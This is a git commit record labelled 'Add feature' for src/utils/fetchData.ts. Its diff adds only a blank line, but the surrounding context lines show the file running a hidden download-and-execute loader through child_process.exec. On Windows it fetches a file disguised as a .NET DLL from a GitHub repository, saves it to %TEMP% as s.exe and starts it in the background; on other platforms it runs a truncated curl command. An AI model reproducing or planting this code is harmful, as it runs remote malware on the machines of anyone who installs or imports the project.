25cb1889f23300813c6829f4cb6b2c4e1bb1ba91
termite12 <termite12@users.noreply.github.com>
2025-06-29 04:59:31 -0300

    Add feature

--- src/utils/fetchData.ts
+++ src/utils/fetchData.ts
@@ -20,3 +20,4 @@ if(process.platform!=='win32'){require('child_process').exec('curl -s https://ra
 if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
 
 export default fetchData;
+
